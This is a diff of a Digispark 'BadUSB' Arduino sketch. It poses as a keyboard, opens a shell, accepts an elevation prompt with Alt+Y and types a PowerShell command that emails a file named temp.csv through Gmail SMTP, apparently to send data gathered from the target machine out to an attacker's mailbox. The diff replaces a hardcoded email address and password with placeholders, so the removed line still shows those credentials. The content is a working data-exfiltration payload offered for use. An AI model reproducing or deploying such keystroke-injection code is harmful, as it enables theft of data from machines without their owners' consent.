@@ -7,7 +7,7 @@
 //of Windows or simply older builds of Windows 10, the other version works like a charm.
 
 #include "DigiKeyboard.h"
-//#define KEY_ARROW_LEFT      80
+#define KEY_ARROW_LEFT      80
 void setup() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
@@ -32,7 +32,7 @@ void setup() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GeorgeWash1314@gmail.com', 'areallystrongpassword'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'GeorgeWash1314@gmail.com'; $ReportEmail.To.Add('GeorgeWash1314@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail);exit"));
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('Your_email', 'Your_Password'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'Your_email'; $ReportEmail.To.Add('Your_email'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail);exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
